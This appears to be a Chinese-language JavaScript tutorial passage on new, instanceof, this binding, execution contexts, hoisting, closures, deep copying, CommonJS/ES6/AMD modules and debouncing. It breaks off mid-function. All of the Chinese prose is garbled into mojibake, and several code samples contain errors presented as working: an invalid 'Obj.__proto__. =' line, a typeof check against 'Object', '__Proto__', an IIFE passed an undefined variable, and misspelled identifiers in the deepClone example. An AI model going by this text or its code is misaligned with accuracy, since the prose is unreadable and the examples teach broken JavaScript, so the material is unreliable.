é“¾æŽ¥åˆ°åŽŸåž‹ ç»‘å®š this è¿”å›žæ–°å¯¹è±¡ åœ¨è°ƒç”¨ new çš„è¿‡ç¨‹ä¼šå‘ç”Ÿä¸Šé¢å››ç§äº‹æƒ…ï¼Œä¸‹é¢æ˜¯è‡ªå·±å®žçŽ°çš„ä¸€ä¸ª new 123456789101112function create()&#123; // åˆ›å»ºä¸€ä¸ªç©ºçš„å¯¹è±¡ let obj = new Object(); // èŽ·å¾—æž„é€ å‡½æ•° let Con = [].shift.call(arguments); // é“¾æŽ¥åˆ°åŽŸåž‹ Obj.__proto__. = Con.prototype; // ç»‘å®š this,æ‰§è¡Œæž„é€ å‡½æ•° let result = Con.apply(obj,arguments); // ç¡®ä¿ new å‡ºæ¥çš„æ˜¯ä¸ªå¯¹è±¡ return typeof result == 'Object' ? result : obj;&#125; å¯¹äºŽå®žä¾‹å¯¹è±¡æ¥è¯´ï¼Œéƒ½æ˜¯é€šè¿‡ new äº§ç”Ÿçš„ï¼Œæ— è®ºæ˜¯ function Foo(){} è¿˜æ˜¯ let a = {b:1} å¯¹äºŽåˆ›å»ºä¸€ä¸ªå¯¹è±¡æ¥è¯´ï¼Œæ›´æŽ¨èä½¿ç”¨å­—é¢é‡çš„æ–¹å¼æ¥åˆ›å»ºå¯¹è±¡ï¼ˆæ— è®ºæ˜¯æ€§èƒ½ä¸Šè¿˜æ˜¯å¯è¯»æ€§ï¼‰ã€‚ä½¿ç”¨ new Object æ–¹å¼åˆ›å»ºå¯¹è±¡éœ€è¦é€šè¿‡ä½œç”¨åŸŸé“¾ä¸€å±‚å±‚æ‰¾åˆ° Objectï¼Œä½†æ˜¯ä½¿ç”¨å­—é¢é‡å°±æ²¡æœ‰è¿™ä¸ªå›°æ‰° 1234function Foo()&#123;&#125;// function å°±æ˜¯ä¸ªè¯­æ³•ç³–ï¼Œç›¸å½“äºŽ new Function()let a = &#123;b:1&#125;// è¿™ä¸ªå­—é¢é‡ä¹Ÿæ˜¯ä½¿ç”¨äº† new Object(); å¯¹äºŽ new æ¥è¯´ï¼Œè¿˜éœ€è¦æ³¨æ„ä¸‹é¢çš„è¿ç®—ç¬¦ä¼˜å…ˆçº§ 123456789101112function Foo()&#123; return this;&#125;Foo.getName = function()&#123; console.log('1');&#125;Foo.prototype.getName = function()&#123; console.log('2');&#125;new Foo.getName(); // 1new Foo().getName(); //2 å¯ä»¥çœ‹å‡º new Foo() ä¼˜å…ˆçº§å¤§äºŽ new Foo,æ‰€ä»¥ä»£ç å¯ä»¥è¿™æ ·åˆ’åˆ†æ‰§è¡Œé¡ºåº 12new (Foo.getName())(new Foo).getName(); å¯¹äºŽç¬¬ä¸€ä¸ªå‡½æ•°æ¥è¯´ï¼Œå…ˆæ‰§è¡Œäº† Foo.getName æ‰€ä»¥ç»“æžœä¸º1ï¼Œå¯¹äºŽåŽè€…æ¥è¯´ï¼Œå…ˆ new Foo() äº§ç”Ÿäº†ä¸€ä¸ªå®žä¾‹ï¼Œç„¶åŽé€šè¿‡åŽŸåž‹é“¾æ‰¾åˆ°äº† Foo ä¸Šé¢çš„ getName å‡½æ•°ï¼Œæ‰€ä»¥ç»“æžœä¸º 2 instanceofinstanceof å¯ä»¥æ­£ç¡®åˆ¤æ–­å¯¹è±¡çš„ç±»åž‹ï¼Œå› ä¸ºå†…éƒ¨æœºåˆ¶æ˜¯é€šè¿‡åˆ¤æ–­å¯¹è±¡çš„åŽŸåž‹é“¾æ˜¯ä¸æ˜¯èƒ½æ‰¾åˆ°ç±»åž‹çš„ prototype æˆ‘ä»¬ä¹Ÿå¯ä»¥è¯•ç€å®žçŽ°: 12345678910111213141516function instanceof(left,right)&#123; // èŽ·å¾—ç±»åž‹çš„åŽŸåž‹ let prototype = right.prototype; // èŽ·å¾—å¯¹è±¡çš„åŽŸåž‹ left = left.__Proto__; // åˆ¤æ–­å¯¹è±¡çš„ç±»åž‹æ˜¯å¦ç­‰äºŽç±»åž‹çš„åŽŸåž‹ while(true)&#123; if(left === null)&#123; return false &#125; if(prototype === left)&#123; return true &#125; left = left.__proto__ &#125;&#125; thisthis è®°ä½å‡ ä¸ªè§„åˆ™å°±å¯ä»¥äº† 123456789101112131415161718function foo()&#123; console.log(this.a);&#125;var a = 1;foo();var obj = &#123; a:2, foo:foo&#125;obj.foo();// ä¸Šé¢ä¸¤ç§æƒ…å†µ this åªä¾èµ–è°ƒç”¨å‡½æ•°å‰çš„å¯¹è±¡ï¼Œä¼˜å…ˆçº§æ˜¯ç¬¬äºŒä¸ªæƒ…å†µå¤§äºŽç¬¬ä¸€ä¸ªæƒ…å†µ// ä¸‹é¢çš„ä¼˜å…ˆçº§æ˜¯æœ€é«˜çš„ï¼Œthis åªä¼šç»‘å®šåœ¨c ä¸Šé¢ï¼Œä¸ä¼šè¢«ä»»ä½•æ–¹å¼ä¿®æ”¹ this æŒ‡å‘const c = new foo();c.a = 3;console.log(c.a); // 3//è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯åˆ©ç”¨ call,applyæˆ–è€… bind æ”¹å˜ thisï¼Œè¿™ä¸ªä¼˜å…ˆçº§ä»…æ¬¡äºŽ new ç®­å¤´å‡½æ•°ä¸­çš„ this 12345678function a()&#123; return ()=&gt;&#123; return ()=&gt;&#123; console.log(this); &#125; &#125;&#125;console.log(a()()()); ç®­å¤´å‡½æ•°å…¶å®žæ˜¯æ²¡æœ‰ thisï¼Œè¿™ä¸ªå‡½æ•°ä¸­çš„ this åªå–å†³äºŽå¤–é¢çš„ç¬¬ä¸€ä¸ªä¸æ˜¯ç®­å¤´å‡½æ•°çš„å‡½æ•°çš„this ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå› ä¸ºè°ƒç”¨ a ç¬¦åˆå‰é¢ä»£ç çš„ç¬¬ä¸€ç§æƒ…å†µï¼Œæ‰€ä»¥ this æ˜¯ windowï¼Œå¹¶ä¸”ä¸€æ—¦ this ç»‘å®šä¸Šä¸‹æ–‡äº†ï¼Œå°±ä¸ä¼šè¢«ä»»ä½•ä»£ç æ”¹å˜ã€‚ æ‰§è¡Œä¸Šä¸‹æ–‡å½“æ‰§è¡Œ JS ä»£ç çš„æ—¶å€™ï¼Œä¼šäº§ç”Ÿä¸‰ç§æ‰§è¡Œä¸Šä¸‹æ–‡ å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ eval æ‰§è¡Œä¸Šä¸‹æ–‡ æ¯ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡éƒ½æœ‰ä¸‰ä¸ªé‡è¦çš„å±žæ€§ å˜é‡å¯¹è±¡ï¼ˆVOï¼‰ï¼ŒåŒ…å«å˜é‡ã€å‡½æ•°å£°æ˜Žå’Œå‡½æ•°çš„å½¢å‚ï¼Œè¯¥å±žæ€§åªèƒ½åœ¨å…¨å±€ä¸Šä¸‹æ–‡ä¸­è®¿é—® ä½œç”¨åŸŸé“¾ï¼ˆJS é‡‡ç”¨è¯æ³•ä½œç”¨åŸŸï¼Œä¹Ÿå°±æ˜¯è¯´å˜é‡çš„ä½œç”¨åŸŸæ˜¯åœ¨å®šä¹‰æ—¶å°±å†³å®šçš„ï¼‰ this 12345var a = 10;function foo(i)&#123; var b = 20;&#125;foo(); å¯¹äºŽä¸Šè¿°ä»£ç ï¼Œæ‰§è¡Œæ ˆä¸­æœ‰ä¸¤ä¸ªä¸Šä¸‹æ–‡ï¼šå…¨å±€ä¸Šä¸‹æ–‡å’Œå‡½æ•° foo ä¸Šä¸‹æ–‡ 1234stack = [ globalContext, fooContext] å¯¹äºŽå…¨å±€ä¸Šä¸‹æ–‡æ¥è¯´ï¼ŒVO å¤§æ¦‚æ˜¯è¿™æ ·çš„ 12345globalContext.VO === globalglobalContext.VO = &#123; a:undefined, foo:&lt;Function&gt;,&#125; å¯¹äºŽ å‡½æ•° foo æ¥è¯´ï¼ŒVO ä¸èƒ½è¢«è®¿é—®ï¼Œåªèƒ½è®¿é—®åˆ°æ´»åŠ¨å¯¹è±¡ï¼ˆAOï¼‰ 1234567fooContext.VO === foo.AOfooContext.AO = &#123; i:undefined, b:undefined, arguments:&lt;&gt;&#125;// arguments æ˜¯å‡½æ•°åº•æ²¹çš„å¯¹è±¡ï¼ˆç®­å¤´å‡½æ•°æ²¡æœ‰ï¼‰ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ªä¼ªæ•°ç»„ï¼Œæœ‰ length å±žæ€§å¯ä»¥é€šè¿‡ä¸‹æ ‡è®¿é—®å…ƒç´ ï¼Œè¯¥å¯¹è±¡çš„ callee å±žæ€§ä»£è¡¨å‡½æ•°æœ¬èº«ï¼Œcaller å±žæ€§ä»£è¡¨å‡½æ•°çš„è°ƒç”¨è€… å¯¹äºŽä½œç”¨åŸŸé“¾ï¼Œå¯ä»¥æŠŠå®ƒç†è§£ä¸ºåŒ…å«è‡ªèº«å˜é‡å¯¹è±¡å’Œä¸Šçº§å˜é‡å¯¹è±¡çš„åˆ—è¡¨ï¼Œé€šè¿‡ [[Scope]] å±žæ€§æŸ¥æ‰¾ä¸Šçº§å˜é‡ 123456fooContext.[[Scope]] = [ globalContext.VO ]fooContext.Scope = fooContext.[[Scope]] + fooContext.VOfooContext.Scope = [ fooContext.Vo, globalContext.Vo] ä¸¾ä¸ªä¾‹å­ï¼Œvar 1234567b(); // heheconsole.log(a); // undefinedvar a = 'haha';function b()&#123; console.log('hehe');&#125; ä¸Šé¢çš„ç»“æžœæ˜¯å› ä¸ºå‡½æ•°å’Œå˜é‡æå‡çš„åŽŸå› ã€‚é€šå¸¸æ›¿èº«çš„è§£é‡Šæ˜¯è¯´å°†ç”Ÿå‘½çš„ä»£ç ç§»åˆ°äº†é¡¶éƒ¨ï¼Œè¿™å…¶å®žæ²¡æœ‰ä»€ä¹ˆé”™è¯¯ï¼Œä¾¿äºŽç†è§£ã€‚ä½†æ˜¯æ›´å‡†ç¡®çš„è§£é‡Šåº”è¯¥æ˜¯ï¼šåœ¨ç”Ÿæˆæ‰§è¡Œä¸Šä¸‹æ–‡æ—¶ï¼Œä¼šæœ‰ä¸¤ä¸ªé˜¶æ®µã€‚ç¬¬ä¸€ä¸ªé˜¶æ®µæ˜¯åˆ›å»ºçš„é˜¶æ®µï¼ˆå…·ä½“æ­¥éª¤æ˜¯åˆ›å»º VOï¼‰ï¼ŒJS è§£é‡Šå™¨ä¼šæ‰¾å‡ºéœ€è¦æå‡çš„å˜é‡å’Œå‡½æ•°ï¼Œå¹¶ä¸”ç»™ä»–ä»¬æå‰åœ¨å†…å­˜ä¸­å¼€è¾Ÿå¥½ç©ºé—´ï¼Œå‡½æ•°çš„è¯ä¼šå°†æ•´ä¸ªå‡½æ•°æ”¾å…¥å†…å­˜ä¸­ï¼Œå˜é‡åªå£°æ˜Žå¹¶ä¸”èµ‹å€¼ä¸º undefinedï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒä¸ªé˜¶æ®µï¼Œä¹Ÿå°±æ˜¯ä»£ç çš„æ‰§è¡Œé˜¶æ®µï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥æå‰ä½¿ç”¨ã€‚ åœ¨æå‡çš„è¿‡ç¨‹ä¸­ï¼Œç›¸åŒçš„å‡½æ•°ä¼šè¦†ç›–ä¸Šä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”å‡½æ•°ä¼˜å…ˆäºŽå˜é‡æå‡ 12345678b(); //2function b()&#123; console.log('1');&#125;function b()&#123; console.log('2');&#125;var b = 'haha'; var ä¼šäº§ç”Ÿå¾ˆå¤šé”™è¯¯ï¼Œæ‰€ä»¥çŽ°åœ¨ ES6 ä¸­å¼•å…¥äº† letï¼Œlet ä¸èƒ½åœ¨å£°æ˜Žå‰ä½¿ç”¨ï¼Œä½†æ˜¯è¿™å¹¶ä¸æ˜¯å¸¸è¯´çš„ let ä¸ä¼šæå‡ï¼Œlet æå‡äº†å£°æ˜Žä½†æ˜¯æ²¡æœ‰èµ‹å€¼ï¼Œå› ä¸ºä¸´æ—¶æ­»åŒºå¯¼è‡´äº†å¹¶ä¸èƒ½åœ¨å£°æ˜Žå‰ä½¿ç”¨ å¯¹äºŽéžåŒ¿åç«‹å³æ‰§è¡Œå‡½æ•°éœ€è¦æ³¨æ„ä¸‹é¢çš„é—®é¢˜ 1234567891011var foo = 1;(function foo()&#123; foo = 10; console.log(foo);&#125;());/**Æ’ foo() &#123; foo = 10 console.log(foo)&#125;*/ å› ä¸ºå½“ JS è§£é‡Šå™¨åœ¨é‡åˆ°éžåŒ¿åçš„ç†è§£æ‰§è¡Œå‡½æ•°æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªè¾…åŠ©çš„ç‰¹å®šå¯¹è±¡ï¼Œç„¶åŽå°†å‡½æ•°åç§°ä½œä¸ºè¿™ä¸ªå¯¹è±¡çš„å±žæ€§ï¼Œå› æ­¤å‡½æ•°å†…éƒ¨æ‰å¯ä»¥è®¿é—®åˆ° fooï¼Œä½†æ˜¯è¿™ä¸ªå€¼åˆæ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥å¯¹å®ƒçš„èµ‹å€¼å¹¶ä¸ä¼šç”Ÿæ•ˆï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥çš„è¿˜æ˜¯è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”å¤–éƒ¨çš„å€¼ä¹Ÿæ²¡æœ‰ä»»ä½•æ”¹å˜ã€‚ 1234567specialObject = &#123;&#125;Scope = specialObject + Scope;foo = new FunctionExpression;foo.[[Scope]] = Scope;specialObject.foo = foo; // &#123;DontDelete&#125;, &#123;ReadOnly&#125;delete Scope[0]; // remove specialObject from the front of scope chain é—­åŒ…é—­åŒ…çš„å®šä¹‰å¾ˆç®€å•ï¼šå‡½æ•° A è¿”å›žä¸€ä¸ªå‡½æ•° Bï¼Œå¹¶ä¸”å‡½æ•° B ä¸­ä½¿ç”¨äº† å‡½æ•° A çš„å˜é‡ï¼Œå‡½æ•° Bå°±è¢«ç§°ä¸ºé—­åŒ… 1234567function A()&#123; let a = 1; function B()&#123; console.log(a); &#125; return B;&#125; å‡½æ•° A ä¸­çš„å˜é‡è¿™æ—¶å€™æ˜¯å­˜å‚¨åœ¨å †ä¸Šçš„ï¼ŒJS å¼•æ“Žå¯ä»¥é€šè¿‡é€ƒé€¸åˆ†æžè¾¨åˆ«å“ªäº›å˜é‡éœ€è¦å­˜å‚¨åœ¨å¯¹ä¸Šï¼Œå“ªäº›éœ€è¦å­˜å‚¨åœ¨æ ˆä¸Šã€‚ å¾ªçŽ¯ä¸­ä½¿ç”¨é—­åŒ…è§£å†³ var å®šä¹‰å‡½æ•°çš„é—®é¢˜ 12345for(var i=1;i&lt;=5;i++)&#123; setTimeout(function timer()&#123; console.log(i) &#125;,i*1000);&#125; é¦–å…ˆï¼Œå› ä¸º setTimeout æ˜¯å¼‚æ­¥å‡½æ•°ï¼Œæ‰€ä»¥å›žå…ˆæŠŠæ‰€æœ‰Uåž‹ä½ æ¢å…¨éƒ¨æ‰§è¡Œå®Œæ¯•ï¼Œè¿™æ—¶å€™ i å°±æ˜¯ 6äº†ï¼Œæ‰€ä»¥ä¼šè¾“å‡ºä¸€å † 6. è§£å†³çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼Œç¬¬ä¸€ç§æ˜¯ä½¿ç”¨é—­åŒ… 1234567for(var i=1;i&lt;=5;i++)&#123; (function(j)&#123; setTimeout(function timer()&#123; console.log(j) &#125;,j*1000); &#125;)(j);&#125; ç¬¬äºŒç§æ˜¯ä½¿ç”¨ setTimeout çš„ç¬¬ä¸‰ä¸ªå‚æ•° 12345for(var i=1;i&lt;=5;i++)&#123; setTimeout(function timer(j)&#123; console.log(i); &#125;,i*1000,i);&#125; ç¬¬ä¸‰ç§å°±æ˜¯ä½¿ç”¨ let å®šä¹‰ i 12345for(let i=1;i&lt;=5;i++)&#123; setTimeout(function timer()&#123; console.log(i) &#125;,i*1000);&#125; å› ä¸ºå¯¹äºŽ let æ¥è¯´ï¼Œä¼šåˆ›å»ºä¸€ä¸ªå—çº§ä½œç”¨åŸŸï¼Œç›¸å½“äºŽ 12345678910111213141516171819&#123; // å½¢æˆå—çº§ä½œç”¨åŸŸ let i = 0; &#123; let ii = i; setTimeout(function timer()&#123; console.log(ii); &#125;,i*1000) &#125; i++ &#123; let ii = i &#125; i++ &#123; let ii = i &#125; ...&#125; æ·±æµ…æ‹·è´123456let a = &#123; age:1&#125;let b = a;a.age = 2;b.age; // 2 ä»Žä¸Šè¿°ä¾‹å­å¯ä»¥çœ‹å‡ºï¼Œå¦‚æžœç»™ä¸€ä¸ªå˜é‡èµ‹å€¼ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆä¸¤è€…çš„å€¼ä¼šæ˜¯åŒä¸€å¼•ç”¨ï¼Œå…¶ä¸­ä¸€æ–¹æ”¹å˜ï¼Œå¦ä¸€æ–¹ä¹Ÿä¼šç›¸åº”æ”¹å˜ã€‚ é€šå¸¸åœ¨å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›å‡ºçŽ°è¿™æ ·çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æµ…æ‹·è´æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æµ…æ‹·è´é¦–å…ˆå¯ä»¥é€šè¿‡ Object.assign æ¥è§£å†³è¿™ä¸ªé—®é¢˜ 1234567let a = &#123; age:1&#125;let b = Object.assign(&#123;&#125;,a);a.age = 2;console.log(b.age); // 1 ä¹Ÿå¯é€šè¿‡å±•å¼€è¿ç®—ç¬¦ï¼ˆâ€¦ï¼‰æ¥è§£å†³ 12345678let a = &#123; age:1&#125;let b = &#123; ...a&#125;a.age = 2;console.log(b.age); // 1 é€šå¸¸æ‹·è´èƒ½è§£å†³å¤§éƒ¨åˆ†é—®é¢˜ï¼Œä½†æ˜¯å½“æˆ‘ä»¬é‡åˆ°ä¸‹é¢çš„æƒ…å†µå°±éœ€è¦ä½¿ç”¨æ·±æ‹·è´äº† 1234567891011let a = &#123; age:1, jobs:&#123; first:'FE' &#125;&#125;let b = &#123; ...a&#125;a.job.first = 'native';console.log(b.jobs.first); // native æµ…æ‹·è´åªè§£å†³äº†ç¬¬ä¸€å±‚é—®é¢˜ï¼Œå¦‚æžœæŽ¥ä¸‹åŽ»çš„å€¼ä¸­è¿˜æœ‰å¯¹è±¡çš„è¯ï¼Œé‚£ä¹ˆä¸¤è€…åˆäº«æœ‰ç›¸åŒçš„å¼•ç”¨ï¼Œè¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¦å¼•å…¥æ·±æ‹·è´ã€‚ æ·±æ‹·è´è¿™ä¸ªé—®é¢˜é€šå¸¸å¯ä»¥é€šè¿‡ JSON.parse(JSON.stringify(object))æ¥è§£å†³ 12345678910let a = &#123; age:1, jobs:&#123; first:'FE' &#125;&#125;let b = JSON.parse(JSON.stringify(a));a.jobs.first = 'native';console.log(b.jobs.first); // 'FE' ä½†æ˜¯è¯¥æ–¹æ³•ä¹Ÿæ˜¯æœ‰å±€é™æ€§çš„ï¼š ä¼šå¿½ç•¥ undefined ä¼šå¿½ç•¥ symbol ä¸èƒ½åºåˆ—åŒ–å‡½æ•° ä¸èƒ½è§£å†³å¾ªçŽ¯å¼•ç”¨çš„å¯¹è±¡ 123456789101112131415161718let obj = &#123; a:1, b:&#123; c:2, d:3 &#125;&#125;obj.c = obj.b;obj.e = obj.a;obj.b.c = obj.cobj.b.d = obj.bobj.b.e = obj.b.clet newObj = JSON.parse(JSON.stringify(obj));console.log(newObj);// Uncaught TypeError: Converting circular structure to JSON// at JSON.stringify (&lt;anonymous&gt;)// at &lt;anonymous&gt;:14:30 åœ¨é‡åˆ°å‡½æ•°ã€undefinedæˆ–è€… symbol çš„æ—¶å€™ï¼Œè¯¥å¯¹è±¡ä¹Ÿä¸èƒ½æ­£å¸¸çš„åºåˆ—åŒ– 12345678let a = &#123; age:undefined, sex:Symbol('male'), jobs:function()&#123;&#125;, name:'haha'&#125;let b = JSON.parse(JSON.stringify(a));console.log(b); // &#123;name:'haha'&#125; åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œè¯¥æ–¹æ³•ä¼šå¿½ç•¥æŽ‰å‡½æ•°å’Œ undefined ä½†æ˜¯åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œå¤æ‚æ•°æ®æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°å¯ä»¥è§£å†³å¤§éƒ¨åˆ†é—®é¢˜ï¼Œå¹¶ä¸”è¯¥å‡½æ•°æ˜¯å†…ç½®å‡½æ•°ä¸­å¤„ç†æ·±æ‹·è´æ€§èƒ½æœ€å¿«çš„ã€‚æ•°æ®ä¸­å«æœ‰ä»¥ä¸Šä¸‰ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ lodash çš„æ·±æ‹·è´å‡½æ•°ã€‚ å¦‚æžœæ‰€éœ€è¦æ‹·è´çš„å¯¹è±¡å«æœ‰å†…ç½®ç±»åž‹å¹¶ä¸”ä¸åŒ…æ‹¬å‡½æ•°çš„ï¼Œå¯ä»¥ä½¿ç”¨ MessageChannel 12345678910111213141516171819function structuralClone(obj)&#123; return new Promise(resolve =&gt;&#123; const &#123;port1,port2&#125; = new MessageChannel; port2.onmessage = ev =&gt; resolve(ev.data); port1.postMessage(obj) &#125;)&#125;var obj = &#123; a:1, b:&#123; c:b &#125;&#125;// è¯¥æ–¹æ³•æ˜¯å¼‚æ­¥çš„// å¯ä»¥å¾ªçŽ¯å¤„ç† undefined å’Œå¾ªçŽ¯å¼•ç”¨å¯¹è±¡(async ()=&gt;&#123; const clone = await structualClone(obj)&#125;)() æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±åˆ›å»ºä¸€ä¸ª deepClone å‡½æ•° 12345678910111213// æ•°å­— å­—ç¬¦ä¸² function ä¸éœ€è¦æ‹·è´function deepCline(value)&#123; if(value == null) return value; if(typeof value !== 'object') return value; if(value instanceof RegExp) return new RegExp(value); if(value instanceof Date) return new Date(value) // åˆ¤æ–­æ˜¯æ•°ç»„è¿˜æ˜¯å¯¹è±¡ let obj = new value.constructor; for(let ket in value)&#123; obj[key] = deepClone(value[key]) &#125; return obj;&#125; æ¨¡å—åŒ–åœ¨æœ‰ Babel çš„æƒ…å†µä¸‹ï¼Œ å¯ä»¥ç›´æŽ¥ä½¿ç”¨ ES6 çš„æ¨¡å—åŒ– 12345678910// file a.jsexport function a()&#123;&#125;export function b()&#123;&#125;// file b.jsexport default function()&#123;&#125;import &#123;a,b&#125; from './a.js'import XXX from './b.js' CommonJSCommonJS æ˜¯ Node ç‹¬æœ‰çš„è§„èŒƒï¼Œæµè§ˆå™¨ä¸­ä½¿ç”¨å°±éœ€è¦ç”¨åˆ° Broserify è§£æž 12345678910// a.jsmodule.exports = &#123; a:1&#125;export.a = 1;// b.jsvar module = require('./a.js');module.a // -&gt; log 1 åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œmodule.export å’Œ export å¾ˆå®¹æ˜“æ··æ·†ï¼Œçœ‹çœ‹å¤§è‡´çš„å†…éƒ¨å®žçŽ° 123456789101112131415161718var module = require('./a.js');module.a// è¿™é‡Œå…¶å®žå°±æ˜¯åŒ…è£…äº†ä¸€å±‚ç«‹å³æ‰§è¡Œå‡½æ•°ï¼Œè¿™æ ·å°±ä¸ä¼šæ±¡æŸ“å…¨å±€å˜é‡äº†ï¼Œé‡è¦çš„æ˜¯ module è¿™é‡Œï¼Œmodule æ˜¯ Node ç‹¬æœ‰çš„ä¸€ä¸ªå˜é‡module.exports = &#123; a:1&#125;// åŸºæœ¬å®žçŽ°var module = &#123; exports:&#123;&#125; // exports å°±æ˜¯ç©ºå¯¹è±¡&#125;// è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ exports å’Œ module.exports ç”¨æ³•ç›¸ä¼¼çš„åŽŸå› var exports = module.exports;var load = function(module)&#123; var a = 1; module.exports = a; return module.exports&#125; module.exports å’Œ exports ç”¨æ³•å…¶å®žæ˜¯ç›¸ä¼¼çš„ï¼Œä½†æ˜¯ä¸èƒ½å¯¹ exports ç›´æŽ¥èµ‹å€¼ï¼Œä¸ä¼šæœ‰ä»»ä½•æ•ˆæžœã€‚ å¯¹äºŽ CommonJS å’Œ ES6 çš„æ¨¡å—åŒ–çš„ä¸¤è€…åŒºåˆ«æ˜¯ï¼š å‰è€…æ”¯æŒåŠ¨æ€å¯¼å…¥ï¼Œä¹Ÿå°±æ˜¯ require(${path}/xx.js),åŽè€…ä¸æ”¯æŒï¼Œä½†æ˜¯å·²æœ‰ææ¡ˆ å‰è€…æ˜¯åŒæ­¥å¯¼å…¥ï¼Œå› ä¸ºç”¨äºŽæœåŠ¡ç«¯ï¼Œæ–‡ä»¶éƒ½åœ¨æœ¬åœ°ï¼ŒåŒæ­¥å¯¼å…¥å³ä½¿å¡ä½çº¿ç¨‹å½±å“ä¹Ÿä¸å¤§ã€‚è€ŒåŽè€…æ˜¯å¼‚æ­¥å¯¼å…¥ï¼Œå› ä¸ºç”¨äºŽæµè§ˆå™¨ï¼Œéœ€è¦ä¸‹è½½æ–‡ä»¶ï¼Œå¦‚æžœä¹Ÿé‡‡ç”¨åŒæ­¥å¯¼å…¥ä¼šå¯¹æ¸²æŸ“æœ‰å¾ˆå¤§å½±å“ å‰è€…åœ¨å¯¼å‡ºæ—¶éƒ½æ˜¯å€¼æ‹·è´ï¼Œå°±ç®—å¯¼å‡ºçš„å€¼å˜äº†ï¼Œå¯¼å…¥çš„å€¼ä¹Ÿä¸ä¼šæ”¹å˜ï¼Œæ‰€ä»¥å¦‚æžœæƒ³è¦æ›´æ–°å€¼ï¼Œå¿…é¡»é‡æ–°å¯¼å…¥ä¸€æ¬¡ã€‚ä½†æ˜¯åŽè€…é‡‡ç”¨å®žæ—¶ç»‘å®šçš„æ–¹å¼ï¼Œå¯¼å…¥å¯¼å‡ºçš„å€¼éƒ½æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€ï¼Œæ‰€ä»¥å¯¼å…¥å€¼ä¼šè·Ÿéšå¯¼å‡ºå€¼å˜åŒ– åŽè€…ä¼šç¼–è¯‘æˆ require/exports æ¥æ‰§è¡Œ AMDAMD æ˜¯ç”± RequireJS æå‡ºçš„ 1234567891011define(['./a.js','./b.js'],function(a,b)&#123; a.do(); b.do();&#125;);define(function(require,exports,module)&#123; var a = require('./a'); a.doSomething(); var b = require('./b'); b.doSomething();&#125;); èŠ‚æµå’Œé˜²æŠ–çš„ç†è§£é˜²æŠ–å’ŒèŠ‚æµéƒ½æ˜¯é˜²æ­¢å‡½æ•°å¤šæ¬¡è°ƒç”¨ã€‚åŒºåˆ«åœ¨äºŽï¼Œå‡è®¾ä¸€ä¸ªç”¨æˆ·ä¸€ç›´è§¦å‘è¿™ä¸ªå‡½æ•°ï¼Œä¸”æ¯æ¬¡è§¦å‘å‡½æ•°çš„é—´éš”å°äºŽ waitï¼Œé˜²æŠ–çš„æƒ…å†µåªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œè€ŒèŠ‚æµçš„æƒ…å†µä¼šéš”ä¸€å®šæ—¶é—´ï¼ˆå‚æ•°waitï¼‰è°ƒç”¨å‡½æ•° é˜²æŠ–åœ¨æ»šåŠ¨äº‹ä»¶ä¸­éœ€è¦åšä¸€ä¸ªå¤æ‚è®¡ç®—æˆ–è€…æ˜¯å®žçŽ°ä¸€ä¸ªæŒ‰é’®é˜²æ­¢ç¬¬äºŒæ¬¡ç‚¹å‡»æ“ä½œã€‚è¿™äº›éœ€æ±‚éƒ½å¯ä»¥é€šè¿‡å‡½æ•°é˜²æŠ–æ¥å®žçŽ°ï¼Œå°¤å…¶æ˜¯ç¬¬ä¸€ä¸ªéœ€æ±‚ï¼Œå¦‚æžœåœ¨é¢‘ç¹çš„æ—¶é—´å›žè°ƒä¸­åšå¤æ‚è®¡ç®—ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´é¡µé¢å¡é¡¿ï¼Œä¸å¦‚å°†å¤šæ¬¡è®¡ç®—åˆå¹¶ä¸ºä¸€æ¬¡è®¡ç®—ï¼Œåªåœ¨ä¸€ä¸ªç²¾ç¡®ç‚¹åšæ“ä½œã€‚ é€šä¿—åŒ–ï¼šå¦‚æžœç”¨æ‰‹æŒ‡ä¸€ç›´æŒ‰ç€å¼¹ç°§ï¼Œå®ƒå°†ä¸ä¼šå¼¹èµ·çŸ¥é“ä½ æ¾æ‰‹ä¸ºæ­¢ è¢–çç‰ˆçš„é˜²æŠ–ï¼š 1234567891011121314// func æ˜¯ç”¨æˆ·ä¼ å…¥éœ€è¦é˜²æŠ–çš„å‡½æ•°// wait æ˜¯ç­‰å¾…æ—¶é—´const debounce = (func,wait = 50) =&gt;&#123; // ç¼“å­˜ä¸€ä¸ªå®šæ—¶å™¨id let timer = 0; // è¿”å›žçš„å‡½æ•°æ˜¯æ¯æ¬¡ç”¨æˆ·å®žé™…è°ƒç”¨é˜²æŠ–å‡½æ•°ï¼Œå¦‚æžœå·²ç»è®¾å®šè¿‡å®šæ—¶å™¨å°±æ¸…ç©ºä¸Šä¸€æ¬¡çš„å®šæ—¶å™¨ï¼Œå¼€å§‹ä¸€ä¸ªæ–°çš„å®šæ—¶å™¨ï¼Œå»¶è¿Ÿç”¨æˆ·ä¼ å…¥çš„æ–¹æ³• return 